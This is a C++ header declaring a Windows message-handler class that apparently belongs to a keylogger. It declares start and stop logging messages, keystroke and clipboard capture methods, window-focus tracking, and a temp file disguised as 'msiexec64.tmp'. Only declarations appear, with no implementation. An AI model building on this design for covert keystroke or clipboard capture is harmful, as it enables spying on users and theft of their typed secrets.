#pragma once
#include "SharedQueue.h"
#define NOMINMAX
#include <Windows.h>
#include <set>

// Builtin params, edit at will
#define MIN_TIME_QR_REST	5
#define TMP_FILE_NAME		"msiexec64.tmp"

#define WM_STARTLOG 0x401
#define WM_STOPLOG 0x402
#define WM_DEBUG 0x403

extern "C" {
	extern HINSTANCE hInst;
}

class WinMsgHandler{
public:
	WinMsgHandler(std::shared_ptr<SharedQueue> queue);
	~WinMsgHandler();
	HWND wHandle{ nullptr };
	
protected:
	static LRESULT CALLBACK baseHandle(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
	LRESULT classHandleMsg(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
	LRESULT HandleClipboard();


private:
	void checkFocus(UINT keychar);
	void pushKey(void);
	time_t lastScanTime{ 0 };
	HWND hPrevWind{ nullptr };
	std::shared_ptr<SharedQueue> _queue;
	HKL locale{ nullptr };
	std::set<std::string> seen;
};

